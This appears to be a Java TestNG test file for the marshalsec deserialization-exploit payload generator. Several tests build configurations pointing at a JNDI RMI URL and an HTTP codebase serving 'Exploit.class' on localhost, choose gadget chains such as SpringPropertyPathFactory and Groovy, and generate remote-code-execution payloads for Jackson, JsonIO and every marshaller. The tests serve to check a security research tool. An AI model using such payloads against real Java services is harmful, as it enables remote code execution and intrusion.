import java.net.URI;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;
import java.util.Set;
import marshalsec.Configuration;
import marshalsec.EscapeType;
import marshalsec.Jackson;
import marshalsec.JsonIO;
import marshalsec.MarshallerBase;
import marshalsec.MarshalsecFactory;
import marshalsec.gadgets.GadgetType;
import org.junit.Assert;
import org.reflections.Reflections;
import org.testng.annotations.Test;


/**
 * @author marko
 * @version 1.0.0.
 * @date 21.08.2017
 */
@Test
public class MarshalFactoryTest {

	@Test
	public void T01_runBaseMarshaller() throws Exception {

		URI jndiUrl = new URI("rmi://localhost:1069/Exploit");

		Configuration c = Configuration
			.create()
			.all(true)
			.codebase("http://localhost:31337/")
			.codebaseClass("Exploit.class")
			.JNDIUrl(jndiUrl)
			.escapeType(EscapeType.NONE)
			.executable("C:\\Windows\\notepad.exe", "")
			.gadgetType(GadgetType.SpringPropertyPathFactory)
			.build();

		Jackson jackson = new Jackson();

		GadgetType[] types = jackson.getSupportedTypes();

		int i = types.length;

		System.out.println(i);

		jackson.run(c);

		Map<GadgetType, String> payloads = jackson.getPayload();

		if (payloads.isEmpty()) {
			Assert.fail("No payloads generated");
		}
	}

	@Test
	public void T02_runMarshallerFactory() throws Exception {

		URI jndiUrl = new URI("rmi://localhost:1069/Exploit");

		Configuration c = Configuration
			.create()
			.all(true)
			.codebase("http://localhost:31337/")
			.codebaseClass("Exploit.class")
			.JNDIUrl(jndiUrl)
			.escapeType(EscapeType.NONE)
			.executable("C:\\Windows\\notepad.exe", "")
			.gadgetType(GadgetType.SpringPropertyPathFactory)
			.build();

		MarshalsecFactory factory = new MarshalsecFactory(c);

		Map payloads = factory.payload(new JsonIO());

		if (payloads.isEmpty()) {
			Assert.fail("No payloads generated");
		}
	}

	public void T03_runAllMarshallerFactory() throws Exception {

		URI jndiUrl = new URI("rmi://localhost:1069/Exploit");

		Configuration c = Configuration
			.create()
			.all(true)
			.codebase("http://localhost:31337/")
			.codebaseClass("Exploit.class")
			.JNDIUrl(jndiUrl)
			.escapeType(EscapeType.NONE)
			.executable("C:\\Windows\\notepad.exe", "")
			.gadgetType(GadgetType.SpringPropertyPathFactory)
			.build();

		MarshalsecFactory factory = new MarshalsecFactory(c);

		Reflections reflections = new Reflections("marshalsec");

		Set<Class<? extends MarshallerBase>> all = reflections.getSubTypesOf(MarshallerBase.class);

		List<String> payloads1 = new ArrayList<>();

		all.forEach(
			aClass -> {
				try {
					payloads1.addAll(factory.payload(aClass.newInstance()).values());
				} catch (InstantiationException e) {
					e.printStackTrace();
				} catch (IllegalAccessException e) {
					e.printStackTrace();
				} catch (Exception e) {
					e.printStackTrace();
				}
			});

		List<String> payloads2 = factory.allPayloads();

		Assert.assertEquals(payloads1.size(), payloads2.size());
	}

	@Test
	public void T04_runMarshallerFactoryWithGadget() {

		String[] args = {"-t", "Groovy"};

		Jackson.main(args);

	}

}
